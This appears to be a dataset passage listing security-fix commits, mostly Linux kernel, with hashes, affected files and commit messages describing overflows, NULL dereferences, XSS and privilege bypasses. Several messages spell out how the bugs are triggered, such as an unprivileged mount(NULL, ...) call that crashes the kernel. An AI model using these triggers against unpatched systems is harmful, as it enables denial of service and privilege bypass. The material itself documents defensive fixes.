    030cf153bea252e28893e7d976f776faa355aa14
    2222ce08ee91ea8d82e8c8222451c4af1bb4c5ef
    29a1ce1b616bf81241cc19b332a61c9995d1dddb
    37902a54e9c154fb8dbed3e1d996d8a198bdc17b
    47d9a875612db1583122805f137f0365e5136ddd
    4ebce4284e9de25a680f2812bc7cb8b393304565
    9b62710891a2b3ebd188e013975537c33bd172e9
    a6028433e3a0f9583e48c5b2369abed53ed0ddd5
    aee1c9f4587677d5ebff08d216bda9ae7e6a228c
    ca3c92a0a14f26898c5e07a137a54393e1279fdd
    db71150b8040d07d9590a8229b9070b7461d7279
    ec83f413a7ed19d41b3a37a0a7e0b1d7b1ce9988
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 208c72f4fe44fe09577e7975ba0e7fa0278f3d03:
nl80211: fix check for valid SSID size in scan operations\n\nIn both trigger_scan and sched_scan operations, we were checking for the SSID length before assigning the value correctly.  Since the memory was just kzalloc'ed, the check was always failing and SSID with over 32 characters were allowed to go through.\n\nThis was causing a buffer overflow when copying the actual SSID to the proper place.\n\nThis bug has been there since 2.6.29-rc4.\n\nCc: stable@kernel.org Signed-off-by: Luciano Coelho <coelho@ti.com> Signed-off-by: John W. Linville <linville@tuxdriver.com>

======================================================================
Commit With Fix: 
    4e78c724d47e2342aa8fde61f6b8536f662f795f
File(s) In Commit: 
    security/tomoyo/mount.c
Blob(s) In Commit: 
    9fc2e15841c96f54edbefb24a96c40405d06bedd
Blob(s) Before Fix: 
    162a864dba24f51c55156d0733fcae3a88df2da6
    82bf8c2390bc7c1b0d376ba22817b688447819cc
    892494ac58e2250c7a7af100cb4113d30d82d3dc
    afa07cf1985fea05f1a0312ed56d26635f7ff436
    fe00cdfd026775b5b3d1c2f32154288cef5a2c17
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4e78c724d47e2342aa8fde61f6b8536f662f795f:
TOMOYO: Fix oops in tomoyo_mount_acl().\n\nIn tomoyo_mount_acl() since 2.6.36, kern_path() was called without checking dev_name != NULL. As a result, an unprivileged user can trigger oops by issuing mount(NULL, "/", "ext3", 0, NULL) request. Fix this by checking dev_name != NULL before calling kern_path(dev_name).\n\nSigned-off-by: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp> Cc: stable@kernel.org Signed-off-by: James Morris <jmorris@namei.org>

======================================================================
Commit With Fix: 
    fc66c5210ec2539e800e87d7b3a985323c7be96e
File(s) In Commit: 
    arch/x86/kernel/cpu/perf_event.c
Blob(s) In Commit: 
    ec46eea0c4edd648df89c6ebe98ce53c2f6efc31
Blob(s) Before Fix: 
    e8dbe179587fcf58f2f3094e825fc1c10512c2bd
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for fc66c5210ec2539e800e87d7b3a985323c7be96e:
perf, x86: Fix Intel fixed counters base initialization\n\nThe following patch solves the problems introduced by Robert's commit 41bf498 and reported by Arun Sharma. This commit gets rid of the base + index notation for reading and writing PMU msrs.\n\nThe problem is that for fixed counters, the new calculation for the base did not take into account the fixed counter indexes, thus all fixed counters were read/written from fixed counter 0. Although all fixed counters share the same config MSR, they each have their own counter register.\n\nWithout:\n\n $ task -e unhalted_core_cycles -e instructions_retired -e baclears noploop 1 noploop for 1 seconds\n\n  242202299 unhalted_core_cycles (0.00% scaling, ena=1000790892, run=1000790892)  2389685946 instructions_retired (0.00% scaling, ena=1000790892, run=1000790892)       49473 baclears             (0.00% scaling, ena=1000790892, run=1000790892)\n\nWith:\n\n $ task -e unhalted_core_cycles -e instructions_retired -e baclears noploop 1 noploop for 1 seconds\n\n 2392703238 unhalted_core_cycles (0.00% scaling, ena=1000840809, run=1000840809)  2389793744 instructions_retired (0.00% scaling, ena=1000840809, run=1000840809)       47863 baclears             (0.00% scaling, ena=1000840809, run=1000840809)\n\nSigned-off-by: Stephane Eranian <eranian@google.com> Cc: peterz@infradead.org Cc: ming.m.lin@intel.com Cc: robert.richter@amd.com Cc: asharma@fb.com Cc: perfmon2-devel@lists.sf.net LKML-Reference: <20110319172005.GB4978@quad> Signed-off-by: Ingo Molnar <mingo@elte.hu>

======================================================================
Commit With Fix: 
    0d0138ebe24b94065580bd2601f8bb7eb6152f56
File(s) In Commit: 
    arch/xtensa/kernel/ptrace.c
Blob(s) In Commit: 
    a0d042aa296755e441fe4266a7103b315a581a34
Blob(s) Before Fix: 
    2dff698ab02e5ce1642248afa0f582b8aa0f112f
    33eea4c16f121bde393508ed132bab7bd4d16d47
    562fac664751df705f2c31cb3a2bc245e9ebd9ec
    885ebe76e4439e64cc28f5c64ffc78ff30da12bc
    9486882ef0afa8318fca682d24ff3c382c18997b
    9d4e1ceb3f09db9234919dc3b0279dd5178f71e4
    c72c9473ef9913f9666ff54f869fe35fdfd27509
    ddce75efd74c665ce23668fece31798cf511716a
    defae539bda9d83f4539c9f5c0d0de55ea35061a
    f0ccfc7634613c16a311e7878cd409d9b10f9e8a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0d0138ebe24b94065580bd2601f8bb7eb6152f56:
xtensa: prevent arbitrary read in ptrace\n\nPrevent an arbitrary kernel read.  Check the user pointer with access_ok() before copying data in.\n\n[akpm@linux-foundation.org: s/EIO/EFAULT/] Signed-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: Christian Zankel <chris@zankel.net> Cc: Oleg Nesterov <oleg@redhat.com> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    554e095a62c4412c91f981e72fd34a936ac2bf1e
File(s) In Commit: 
    Pyro/ext/daemonizer.py
Blob(s) In Commit: 
    11b50614d4672c41e13b7c4af756892d2ee32fdc
Blob(s) Before Fix: 
    e4818777deea391580cf825742ff0f595a63e6c8
Projects:
    irmen_Pyro3
Commit Message for 554e095a62c4412c91f981e72fd34a936ac2bf1e:
changed pidfile location because of security vulnerability, debian bug #631912

======================================================================
Commit With Fix: 
    aba8d056078e47350d85b06a9cabd5afcc4b72ea
File(s) In Commit: 
    tools/perf/util/config.c
Blob(s) In Commit: 
    6c86eca8b1b7afc745433b9284e95c4ab94f86e8
Blob(s) Before Fix: 
    0deac6a14b652df87c998b38203b0ab003f541ed
    1720d0101b0b516d761f9857181d23136a4cce6a
    5e0720645d3cf6cd08556313448fbb9ad527fbe4
    6faa3a18bfbd8514001e2d2dd25a9f9a52ce7910
    80d9598db31a2c2dbeef1c58322dd6d147f65479
    8784649109ce88de709c08e30eeb06f25aaa04f4
    dabe892d0e5374ad8689040e6865a642e161f752
    e02d78cae70f688fc0fc32957d078cf45796ed75
    fe02903f7d0f0d11e0dacaf24d03672f7af1a79a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for aba8d056078e47350d85b06a9cabd5afcc4b72ea:
perf tools: do not look at ./config for configuration\n\nIn addition to /etc/perfconfig and $HOME/.perfconfig, perf looks for configuration in the file ./config, imitating git which looks at $GIT_DIR/config.  If ./config is not a perf configuration file, it fails, or worse, treats it as a configuration file and changes behavior in some unexpected way.\n\n"config" is not an unusual name for a file to be lying around and perf does not have a private directory dedicated for its own use, so let's just stop looking for configuration in the cwd.  Callers needing context-sensitive configuration can use the PERF_CONFIG environment variable.\n\nRequested-by: Christian Ohm <chr.ohm@gmx.net> Cc: 632923@bugs.debian.org Cc: Ben Hutchings <ben@decadent.org.uk> Cc: Christian Ohm <chr.ohm@gmx.net> Cc: Ingo Molnar <mingo@elte.hu> Cc: Paul Mackerras <paulus@samba.org> Cc: Peter Zijlstra <a.p.zijlstra@chello.nl> Link: http://lkml.kernel.org/r/20110805165838.GA7237@elie.gateway.2wire.net Signed-off-by: Jonathan Nieder <jrnieder@gmail.com> Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>

======================================================================
Commit With Fix: 
    b5b515445f4f5a905c5dd27e6e682868ccd6c09d
File(s) In Commit: 
    drivers/scsi/pmcraid.c
Blob(s) In Commit: 
    d079f9a3c6b3a7fc2dedd4cc850d32fcc82b4930
Blob(s) Before Fix: 
    067ee4dfbf26c1bb2060779585054720436c8679
    06ea03d05b9359e15013109f568fdafc19ee95bc
    0a97bc9074bb2676429a2d777d5597e2ec8645c3
    321cf3ae863084d5f655f1dbe410fbca4c9ce75c
    34c6b896a91b98cf2328b251058c7aa82ce2829a
    5163edb925cb33684702cc4c4b061a254c2b98df
    53aefffbaead2027c09d2da7925fe3c0afecb607
    7f636b118287a7bb0f9e3ac7d1cdecb27ed0598d
    9ab8c86fc39af61c9966a77a55d813e8ce6da456
    b6f1ef954af1b469a75ca7ab96c1112b8034146c
    bcf858e88c64eb2e0c53ed49be6624259e11864c
    be8ce54f99b247bcba427a16c2f4873b987329c8
    c44e4ab4e938db7a3d370d9406a801f324bc7132
    ce0701d512f423e5b67cd3d5587cb4f3bee309df
    d775596d0613fea60cc3d836ea1cdfc31d72186b
    e7d2688fbeba9f6cd2ca37d27f5c4229347bd4ae
    ea8a0b47d66da53752a886b83c2b6bafc68f8135
    ecc45c8b4e6bd47d851c79f82c69af9447861b25
    edec8dc9d7628374a633d16466a905406137e09c
    f7c70e2a8224b442b827f255728a784ceaf0b0c5
    fbf377ecbdd6ac504b7d5129aaaf04eb2158ba76
    fca6a895307093a4630530b83e03e66b7fd447cd
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b5b515445f4f5a905c5dd27e6e682868ccd6c09d:
[SCSI] pmcraid: reject negative request size\n\nThere's a code path in pmcraid that can be reached via device ioctl that causes all sorts of ugliness, including heap corruption or triggering the OOM killer due to consecutive allocation of large numbers of pages.\n\nFirst, the user can call pmcraid_chr_ioctl(), with a type PMCRAID_PASSTHROUGH_IOCTL.  This calls through to pmcraid_ioctl_passthrough().  Next, a pmcraid_passthrough_ioctl_buffer is copied in, and the request_size variable is set to buffer->ioarcb.data_transfer_length, which is an arbitrary 32-bit signed value provided by the user.  If a negative value is provided here, bad things can happen.  For example, pmcraid_build_passthrough_ioadls() is called with this request_size, which immediately calls pmcraid_alloc_sglist() with a negative size. The resulting math on allocating a scatter list can result in an overflow in the kzalloc() call (if num_elem is 0, the sglist will be smaller than expected), or if num_elem is unexpectedly large the subsequent loop will call alloc_pages() repeatedly, a high number of pages will be allocated and the OOM killer might be invoked.\n\nIt looks like preventing this value from being negative in pmcraid_ioctl_passthrough() would be sufficient.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: James Bottomley <JBottomley@Parallels.com>

======================================================================
Commit With Fix: 
    819cbb120eaec7e014e5abd029260db1ca8c5735
File(s) In Commit: 
    drivers/staging/comedi/comedi_fops.c
Blob(s) In Commit: 
    419976b40bf47d0f46ed997d34650a72f7d5b0a4
Blob(s) Before Fix: 
    15a209f5b486859bf899091238b167f21f1229d6
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 819cbb120eaec7e014e5abd029260db1ca8c5735:
staging: comedi: fix infoleak to userspace\n\ndriver_name and board_name are pointers to strings, not buffers of size COMEDI_NAMELEN.  Copying COMEDI_NAMELEN bytes of a string containing less than COMEDI_NAMELEN-1 bytes would leak some unrelated bytes.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com> Cc: stable <stable@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>

======================================================================
Commit With Fix: 
    317f3db3a3c68775de3acf3b15f55b1e3c18f93b
File(s) In Commit: 
    core/filter_api.php
Blob(s) In Commit: 
    4224472639861474b60bc61151b786e16d3f2547
Blob(s) Before Fix: 
    96a0b8cf549fe0f3f34c850cdc4e71deafb9a24e
Projects:
    01-Scripts_mantisbt
Commit Message for 317f3db3a3c68775de3acf3b15f55b1e3c18f93b:
Fix #13245: XSS issues with search.php parameters\n\nNet.Edit0r (Net.Edit0r@Att.net) from BlACK Hat Group [http://black-hg.org] posted a vulnerability report for an XSS issue in search.php for MantisBT 1.2.6.\n\nThe full report is available at http://packetstormsecurity.org/files/104149\n\nfilter_api.php is the culprit for this vulnerability as it passes user supplied search parameters back into output without first escaping the values.\n\nIt should be noted that numerous other XSS vulnerabilities (all related) have been fixed with this patch. In other words, it is not just the project_id parameter to search.php that was affected - it was numerous other parameters/fields as well.\n\nThe second SQL injection vulnerability identified by Net.Edit0r is invalid because the only time we ever make reference to "mbadmin" in the source code is:\n\ncore.php: if ( file_exists( 'mantis_offline.php' ) && !isset( $_GET['mbadmin'] ) )\n\nThis usage is safe because nothing is ever done with $_GET['mbadmin']. It may be the case that the user's customised version of mantis_offline.php was incorrectly dumping the value of $_GET['mbadmin'] to the screen. The default/sample mantis_offline.php has been checked and does not print any dynamically created strings/user supplied values.

======================================================================
Commit With Fix: 
    cbfe2ed36dd77c0843702935dea7f914bb599201
File(s) In Commit: 
    src/webui/app/controllers/project_controller.rb
Blob(s) In Commit: 
    9d97ae76202f3b41a5fc8ae60e2bc9cc4a4c772a
Blob(s) Before Fix: 
    5aed60fa3b9a6755b0a45575c6f0ecc4129b6e75
Projects:
    Abdelhamidhenni_open-build-service
Commit Message for cbfe2ed36dd77c0843702935dea7f914bb599201:
[webui] check the value of the scheduler parameter

======================================================================
Commit With Fix: 
    f0f74b3f6ac6d47f7919aa9db380c0ad41ffe55f
File(s) In Commit: 
    modules/KIWIRoot.pm
Blob(s) In Commit: 
    190d7c9bfc036cfe3591245811624833ccb8bb96
Blob(s) Before Fix: 
    2006910f11ad6d29bec8e350ea363b27511ea099
Projects:
    AdamMajer_kiwi
Commit Message for f0f74b3f6ac6d47f7919aa9db380c0ad41ffe55f:
- fixed escaping of chown parameters (bnc #725706)

======================================================================
Commit With Fix: 
    9438fabb73eb48055b58b89fc51e0bc4db22fabd
File(s) In Commit: 
    fs/cifs/cifssmb.c
Blob(s) In Commit: 
    a80f7bd97b90d541e9305d7e225c708f3f0cd3d1
Blob(s) Before Fix: 
    07132c4e99f3381faba96d1c436867f0eb8e72ca
    1a9fe7f816d1b83dd630141412d3dd109b23a385
    219933b1856128a089868004468ea8acbca280db
    2777d5f7be7f694f2790a777d4efa24b7c52497b
    6600aa2d2ef38a38c228a1cd26cbeae2ea2b6b06
    6b764d7505defe6f2f17ad52ff51e69f7e741df9
    6ce4e0954b986ac1dd40bfb6dd9a8a851bef68d1
    7e83b356cc9e3a93c2bc1b0e915d118884170474
    941441d3e3860163a51dd5f737cfe9771f283fa9
    aac37d99a487bfe9b40d1107ba67973bf212ed54
    c65c3419dd3703f12bb4994e9333c085c907ecfa
    d06260251c304692dc2789c14059170245ad2957
    db85f7ed76f11c811835759bd560d52e9ffb9bd1
    df959bae67281597a2c1b4ce643eb3893b0e6ee2
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 9438fabb73eb48055b58b89fc51e0bc4db22fabd:
cifs: fix possible memory corruption in CIFSFindNext\n\nThe name_len variable in CIFSFindNext is a signed int that gets set to the resume_name_len in the cifs_search_info. The resume_name_len however is unsigned and for some infolevels is populated directly from a 32 bit value sent by the server.\n\nIf the server sends a very large value for this, then that value could look negative when converted to a signed int. That would make that value pass the PATH_MAX check later in CIFSFindNext. The name_len would then be used as a length value for a memcpy. It would then be treated as unsigned again, and the memcpy scribbles over a ton of memory.\n\nFix this by making the name_len an unsigned value in CIFSFindNext.\n\nCc: <stable@kernel.org> Reported-by: Darren Lavender <dcl@hppine99.gbr.hp.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <sfrench@us.ibm.com>

======================================================================
Commit With Fix: 
    c2183d1e9b3f313dd8ba2b1b0197c8d9fb86a7ae
File(s) In Commit: 
    fs/fuse/dev.c
Blob(s) In Commit: 
    168a80f7f12b856e795eb916bf79f5e2348e06f6
Blob(s) Before Fix: 
    51d9e33d634f4fb40f28fc00276123e1dc8f13c0
    5cb8614508c339fb5e0c18031f3ebf249a4ec6c0
    640fc229df10323b6c9fc94b0bda452157bf1ef0
    650546f8612d44d1200e2530ec704f52ac3b592b
    cf8d28d1fbadb90dd50725c950fa9f6f30bb426b
    e53df5ebb2b89904046e8a06808f68cd25fd6b5d
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c2183d1e9b3f313dd8ba2b1b0197c8d9fb86a7ae:
fuse: check size of FUSE_NOTIFY_INVAL_ENTRY message\n\nFUSE_NOTIFY_INVAL_ENTRY didn't check the length of the write so the message processing could overrun and result in a "kernel BUG at fs/fuse/dev.c:629!"\n\nReported-by: Han-Wen Nienhuys <hanwenn@gmail.com> Signed-off-by: Miklos Szeredi <mszeredi@suse.cz> CC: stable@kernel.org

======================================================================
Commit With Fix: 
    d00745f5e267eba4ca34286d125de685bc3a8034
File(s) In Commit: 
    config_defaults_inc.php
Blob(s) In Commit: 
    74acccc70eb2924b58f8fad2d8f5d91ecc64e9d1
Blob(s) Before Fix: 
    e060900a00cbd468c763d61166caa1b02b9faceb
Projects:
    01-Scripts_mantisbt
Commit Message for d00745f5e267eba4ca34286d125de685bc3a8034:
Fix issue introduced previously whereby php_Self is now used unchecked.\n\nintroduced previously by john attempting to fix symlinks. Since we now use php 5.2, we can make use of filter_var.\n\nThis is a simpler version of what we were trying to do previously aka http://git.mantisforge.org/w/mantisbt.git?a=commitdiff h=5ac1fdf32717d0c82cca7e7660dd4fd316a6a1b8\n\nDepending on server/mantis config this can lead to XSS issues\n\nDavid: Backported from master branch and removed unreachable code branch.\n\nSigned-off-by: David Hicks <d@hx.id.au>

======================================================================
Commit With Fix: 
    70945643722ffeac779d2529a348f99567fa5c33
File(s) In Commit: 
    fs/cifs/connect.c
Blob(s) In Commit: 
    5eacb89d4a4f9af0c0bf3676e6cdc7c6640d53b1
Blob(s) Before Fix: 
    94a05a681f841945cd8adf021250c14ee0413617
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 70945643722ffeac779d2529a348f99567fa5c33:
cifs: always do is_path_accessible check in cifs_mount\n\nCurrently, we skip doing the is_path_accessible check in cifs_mount if there is no prefixpath. I have a report of at least one server however that allows a TREE_CONNECT to a share that has a DFS referral at its root. The reporter in this case was using a UNC that had no prefixpath, so the is_path_accessible check was not triggered and the box later hit a BUG() because we were chasing a DFS referral on the root dentry for the mount.\n\nThis patch fixes this by removing the check for a zero-length prefixpath.  That should make the is_path_accessible check be done in this situation and should allow the client to chase the DFS referral at mount time instead.\n\nCc: stable@kernel.org Reported-and-Tested-by: Yogesh Sharma <ysharma@cymer.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <sfrench@us.ibm.com>

======================================================================
Commit With Fix: 
    dd50a50a2760f10bd2d09814e30af4b36052ca6d
File(s) In Commit: 
    include/functions.php
Blob(s) In Commit: 
    ca9bf2021064f95daf85891d2baa793c50aa5902
Blob(s) Before Fix: 
    703d640d00989394fd9adfc8f92b837e3f1a3dae
Projects:
    18jaguar18_punbb
Commit Message for dd50a50a2760f10bd2d09814e30af4b36052ca6d:
Fix XSS vulnerabilities described on http://seclists.org/fulldisclosure/2011/Sep/158

======================================================================
Commit With Fix: 
    92e22ca23e52066da2258df8c76a2dca8a428bcc
File(s) In Commit: 
    device-linux.c
Blob(s) In Commit: 
    709eebc630e69faa8f5300a45f39c70742fa5add
Blob(s) Before Fix: 
    3bb0beb6650a20a8bbc333128a44c06f4eba9d85
Projects:
    BrainSlayer_radvd
Commit Message for 92e22ca23e52066da2258df8c76a2dca8a428bcc:
set_interface_var() doesn't check interface name and blindly does fopen(path "/" ifname, "w") on it.  As "ifname" is an untrusted input, it should be checked for ".." and/or "/" in it.  Otherwise, an infected unprivileged daemon may overwrite contents of file named "mtu", "hoplimit", etc. in arbitrary location with arbitrary 32-bit value in decimal representation ("%d").  If an attacker has a local account or may create arbitrary symlinks with these names in any location (e.g. /tmp), any file may be overwritten with a decimal value.

======================================================================
Commit With Fix: 
    a5b2c5b2ad5853591a6cac6134cd0f599a720865
File(s) In Commit: 
    security/apparmor/lsm.c
Blob(s) In Commit: 
    ec1bcecf2cdacd6009c79d6a809d4b7b8443f29d
Blob(s) Before Fix: 
    3d2fd141dff76f078d171e2abf28fd4e97b5378c
    ae3a698415e63603d9b159814b45c58b0f83eee0
    b7106f192b75d5d382e806d303a9b2f6bb879747
    cf1de4462ccd3fb297f48bf351dd3494804f22c1
    e2e902f39ac2f3b3071917a8fbffa5764cab9526
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a5b2c5b2ad5853591a6cac6134cd0f599a720865:
AppArmor: fix oops in apparmor_setprocattr\n\nWhen invalid parameters are passed to apparmor_setprocattr a NULL deref oops occurs when it tries to record an audit message. This is because it is passing NULL for the profile parameter for aa_audit. But aa_audit now requires that the profile passed is not NULL.\n\nFix this by passing the current profile on the task that is trying to setprocattr.\n\nSigned-off-by: Kees Cook <kees@ubuntu.com> Signed-off-by: John Johansen <john.johansen@canonical.com> Cc: stable@kernel.org Signed-off-by: James Morris <jmorris@namei.org>

======================================================================
Commit With Fix: 
    76597cd31470fa130784c78fadb4dab2e624a723
File(s) In Commit: 
    fs/proc/task_mmu.c
Blob(s) In Commit: 
    2e7addfd9803559ca03a2527aaab161006e3b482
Blob(s) Before Fix: 
    271afc48b9a5d58dd2874d41f8a08dfcae644481
    2a1bef9203c6e73734e7fa359873bbb45456d0ae
    47c03f4336b843ed1ba9a7f28b3f4824e1c663d1
    47f5b145f56eee5aaefc3b52aac8fa78b978b692
    60b914860f815e146d8ae5fea8eefae2dcaf95ea
    7c708a418acc38412f4a4d77626be3dc4b39e03f
    93381aae93634e843c0a75b17e2448dc95581fdf
    aea1d3f1ffb5e761471f90a2f80096ac16031c62
    c126c83b9a45bc838125d1ac12b44e13f89d8b26
    f269ee673c8bfea5df1c9d7800b614c791aadf9f
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 76597cd31470fa130784c78fadb4dab2e624a723:
proc: fix oops on invalid /proc/<pid>/maps access\n\nWhen m_start returns an error, the seq_file logic will still call m_stop with that error entry, so we'd better make sure that we check it before using it as a vma.\n\nIntroduced by commit ec6fd8a4355c ("report errors in /proc/*/*map* sanely"), which replaced NULL with various ERR_PTR() cases.\n\n(On ia64, you happen to get a unaligned fault instead of a page fault, since the address used is generally some random error code like -EPERM)\n\nReported-by: Anca Emanuel <anca.emanuel@gmail.com> Reported-by: Tony Luck <tony.luck@intel.com> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: Américo Wang <xiyou.wangcong@gmail.com> Cc: Stephen Wilson <wilsons@start.ca> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    667eff35a1f56fa74ce98a0c7c29a40adc1ba4e3
File(s) In Commit: 
    fs/ext4/extents.c
Blob(s) In Commit: 
    e363f21b091bcbac17b84a3bbdee6a6d5d20d65d
Blob(s) Before Fix: 
    06328d3e5717fd368ce7872fe0aa3db879cf6817
    10317eb1d2a93a5426798961e3ef6c358b61d41c
    10539e364283ad9e0f21eaffe5eb5c9a65f2fed4
    236b834b4ca811913f98caf6c9a264844fe8f7de
    4890d6f3ad15a976417ae542296a0051fe97bc27
    7d7b74e9468757a241959fd9903d7e5951ab5843
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 667eff35a1f56fa74ce98a0c7c29a40adc1ba4e3:
ext4: reimplement convert and split_unwritten\n\nReimplement ext4_ext_convert_to_initialized() and ext4_split_unwritten_extents() using ext4_split_extent()\n\nSigned-off-by: Yongqiang Yang <xiaoqiangnk@gmail.com> Signed-off-by: "Theodore Ts'o" <tytso@mit.edu> Tested-by: Allison Henderson <achender@linux.vnet.ibm.com>

======================================================================
Commit With Fix: 
    bfdc0b497faa82a0ba2f9dddcf109231dd519fcc
File(s) In Commit: 
    kernel/sysctl.c
Blob(s) In Commit: 
    c0bb32414b174d575f836c9eb779f2e30cb793dd
Blob(s) Before Fix: 
    0d949c517412ee16822a5ca7d6e7c79218543741
    0f1bd83db98523333b9fabde37d200512b20b77e
    126da64b9c3bf185e5559175bc0fdafb57b7c345
    3a45c224770fb82fa4bd76f9c7d4f2f989ee5aa9
    40245d697602be1965ab763bf7dc7798a03b960b
    443fd2081a74a848e53eb7adb3d09a38a9edf796
    4eed0af5d1442c6ec4cfbd2f6c82e48debdca677
    56f6fc1178ae29b2207c73649a69e11f97aac378
    5abfa151855493735a91fd45a255a45727c8ba97
    8686b0f5fc12fc85d19c31d934bbe34bd55d5af2
    8a68b244846805869e90f242fb563913ff485d5c
    97ab1690f5ed4678d48caa75ed3b71ac5e3970dd
    997080f00e0bcbfca3669af93a97eb5951c17811
    99aed9f8ad35cbe2f2195d2fc707ac64a6045d44
    bc86bb32e12620c463699c9e461c836ce37733c1
    e21ac6f9d413802b5318d87fc683333fdb138b4e
    f88552c6d2275be1216187f07b1e0e1b22b93af2
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for bfdc0b497faa82a0ba2f9dddcf109231dd519fcc:
sysctl: restrict write access to dmesg_restrict\n\nWhen dmesg_restrict is set to 1 CAP_SYS_ADMIN is needed to read the kernel ring buffer.  But a root user without CAP_SYS_ADMIN is able to reset dmesg_restrict to 0.\n\nThis is an issue when e.g.  LXC (Linux Containers) are used and complete user space is running without CAP_SYS_ADMIN.  A unprivileged and jailed root user can bypass the dmesg_restrict protection.\n\nWith this patch writing to dmesg_restrict is only allowed when root has CAP_SYS_ADMIN.\n\nSigned-off-by: Richard Weinberger <richard@nod.at> Acked-by: Dan Rosenberg <drosenberg@vsecurity.com> Acked-by: Serge E. Hallyn <serge@hallyn.com> Cc: Eric Paris <eparis@redhat.com> Cc: Kees Cook <kees.cook@canonical.com> Cc: James Morris <jmorris@namei.org> Cc: Eugene Teo <eugeneteo@kernel.org> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    7ed47b7d142ec99ad6880bbbec51e9f12b3af74c
File(s) In Commit: 
    crypto/ghash-generic.c
Blob(s) In Commit: 
    7835b8fc94db6d69b9e93c1806d677e8ea390736
Blob(s) Before Fix: 
    0529132de1f1c31fb860540a6059a18ab447494d
    12ad3e3a84e3d7d570e75fad4c521718a3bf9790
    179d327af2507de113e4ff89765ecf64d10cedd5
    697e2bbb1914316cd477340b74efe4a2dce405d9
    9d3f0c69a86ff2caeb33b7cddccbf8a80c7f7926
    be4425616931ffcf0f1747aa752d76f15379c989
    bf5f8d7f1a871370028a78a42f4ba0701b091f23
    c42dd4ee90ad7bc8edcb92eb91396225908b7261
    d9f192b953b22b06ea4adc6b921a1d59a1dde1f2
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 7ed47b7d142ec99ad6880bbbec51e9f12b3af74c:
crypto: ghash - Avoid null pointer dereference if no key is set\n\nThe ghash_update function passes a pointer to gf128mul_4k_lle which will be NULL if ghash_setkey is not called or if the most recent call to ghash_setkey failed to allocate memory.  This causes an oops.  Fix this up by returning an error code in the null case.\n\nThis is trivially triggered from unprivileged userspace through the AF_ALG interface by simply writing to the socket without setting a key.\n\nThe ghash_final function has a similar issue, but triggering it requires a memory allocation failure in ghash_setkey _after_ at least one successful call to ghash_update.\n\n  BUG: unable to handle kernel NULL pointer dereference at 00000670   IP: [<d88c92d4>] gf128mul_4k_lle+0x23/0x60 [gf128mul]   *pde = 00000000   Oops: 0000 [#1] PREEMPT SMP   Modules linked in: ghash_generic gf128mul algif_hash af_alg nfs lockd nfs_acl sunrpc bridge ipv6 stp llc\n\n  Pid: 1502, comm: hashatron Tainted: G        W   3.1.0-rc9-00085-ge9308cf #32 Bochs Bochs   EIP: 0060:[<d88c92d4>] EFLAGS: 00000202 CPU: 0   EIP is at gf128mul_4k_lle+0x23/0x60 [gf128mul]   EAX: d69db1f0 EBX: d6b8ddac ECX: 00000004 EDX: 00000000   ESI: 00000670 EDI: d6b8ddac EBP: d6b8ddc8 ESP: d6b8dda4    DS: 007b ES: 007b FS: 00d8 GS: 0033 SS: 0068   Process hashatron (pid: 1502, ti=d6b8c000 task=d6810000 task.ti=d6b8c000)   Stack:    00000000 d69db1f0 00000163 00000000 d6b8ddc8 c101a520 d69db1f0 d52aa000    00000ff0 d6b8dde8 d88d310f d6b8a3f8 d52aa000 00001000 d88d502c d6b8ddfc    00001000 d6b8ddf4 c11676ed d69db1e8 d6b8de24 c11679ad d52aa000 00000000   Call Trace:    [<c101a520>] ? kmap_atomic_prot+0x37/0xa6    [<d88d310f>] ghash_update+0x85/0xbe [ghash_generic]    [<c11676ed>] crypto_shash_update+0x18/0x1b    [<c11679ad>] shash_ahash_update+0x22/0x36    [<c11679cc>] shash_async_update+0xb/0xd    [<d88ce0ba>] hash_sendpage+0xba/0xf2 [algif_hash]    [<c121b24c>] kernel_sendpage+0x39/0x4e    [<d88ce000>] ? 0xd88cdfff    [<c121b298>] sock_sendpage+0x37/0x3e    [<c121b261>] ? kernel_sendpage+0x4e/0x4e    [<c10b4dbc>] pipe_to_sendpage+0x56/0x61    [<c10b4e1f>] splice_from_pipe_feed+0x58/0xcd    [<c10b4d66>] ? splice_from_pipe_begin+0x10/0x10    [<c10b51f5>] __splice_from_pipe+0x36/0x55    [<c10b4d66>] ? splice_from_pipe_begin+0x10/0x10    [<c10b6383>] splice_from_pipe+0x51/0x64    [<c10b63c2>] ? default_file_splice_write+0x2c/0x2c    [<c10b63d5>] generic_splice_sendpage+0x13/0x15    [<c10b4d66>] ? splice_from_pipe_begin+0x10/0x10    [<c10b527f>] do_splice_from+0x5d/0x67    [<c10b6865>] sys_splice+0x2bf/0x363    [<c129373b>] ? 